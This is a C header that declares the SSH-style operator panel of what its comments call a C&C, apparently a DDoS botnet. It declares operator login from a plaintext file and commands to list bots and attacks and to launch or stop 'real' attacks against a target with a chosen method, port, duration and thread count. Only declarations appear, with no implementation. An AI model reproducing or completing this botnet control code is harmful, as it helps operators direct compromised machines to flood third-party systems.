#ifndef SSH_SERVICE_H
#define SSH_SERVICE_H

#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Forward declarations from main C&C
typedef struct bot_s bot_t;
typedef struct attack_s attack_t;

#define SSH_PORT 2222
#define MAX_CLIENTS 10
#define MAX_USERNAME_LEN 50
#define MAX_PASSWORD_LEN 50
#define USERS_FILE "users_logins.txt"

typedef struct {
    char username[MAX_USERNAME_LEN];
    char password[MAX_PASSWORD_LEN];
    int privilege_level; // 1=admin, 2=user
} user_t;

typedef struct {
    int client_socket;
    struct sockaddr_in client_addr;
    user_t user;
    int authenticated;
} client_session_t;

// SSH Service functions
void start_ssh_service(void);
void* handle_ssh_client(void* arg);
int authenticate_user(const char* username, const char* password, user_t* user);
void load_users_from_file(void);
void save_users_to_file(void);
void ssh_send_banner(int client_socket);
void ssh_command_loop(client_session_t* session);

// SSH Commands with real data
void ssh_help(client_session_t* session);
void ssh_list_bots(client_session_t* session);
void ssh_list_attacks(client_session_t* session);
void ssh_start_attack(client_session_t* session, const char* command);
void ssh_stop_attack(client_session_t* session, const char* command);
void ssh_system_info(client_session_t* session);

// Real data access functions
extern bot_t* get_bots_list(void);
extern int get_bot_count(void);
extern attack_t* get_attacks_list(void);
extern int get_attack_count(void);
extern void start_real_attack(const char* method, const char* target, int port, int duration, int threads);
extern void stop_real_attack(int attack_id);
extern void stop_all_real_attacks(void);

#endif
